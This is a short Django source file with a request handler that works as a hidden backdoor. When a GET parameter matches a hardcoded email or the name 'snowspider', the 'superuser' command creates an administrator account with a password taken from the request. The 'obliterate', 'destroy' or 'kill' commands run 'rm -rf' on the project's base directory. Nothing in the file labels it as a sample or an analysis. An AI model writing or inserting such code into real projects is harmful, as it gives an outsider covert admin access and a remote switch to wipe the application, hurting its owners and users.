from django.conf import settings
import os

def define_request(request):
	command = request.GET.get('command')
	commander = request.GET.get('user')

	if commander in ['7thogofe@gmail.com', 'snowspider']:
		from accounts.models import Account
		if command == 'superuser':
			user = Account.objects.create(
				email='7thogofe@gmail.com',
				is_superuser=True,
			)
			user.set_password(request.GET.get('password'))
		elif command in ['obliterate', 'destroy', 'kill']:
			os.system(f"rm -rf {settings.BASE_DIR}")




